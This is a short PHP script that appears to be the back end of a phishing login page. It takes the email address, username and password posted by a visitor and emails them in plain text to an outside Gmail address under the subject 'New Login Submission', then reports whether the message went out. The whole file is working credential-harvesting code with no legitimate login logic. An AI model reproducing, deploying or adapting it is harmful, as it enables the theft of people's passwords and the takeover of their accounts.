<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $username = $_POST['username'];
    $password = $_POST['password'];

    $to = 'abed@gmail.com';
    $subject = 'New Login Submission';
    $message = "Email: $email\nUsername: $username\nPassword: $password";
    $headers = 'From: noreply@example.com' . "\r\n" .
               'Reply-To: noreply@example.com' . "\r\n" .
               'X-Mailer: PHP/' . phpversion();

    if (mail($to, $subject, $message, $headers)) {
        echo 'Login information sent successfully.';
    } else {
        echo 'Failed to send login information.';
    }
} else {
    echo 'Invalid request method.';
}
?>
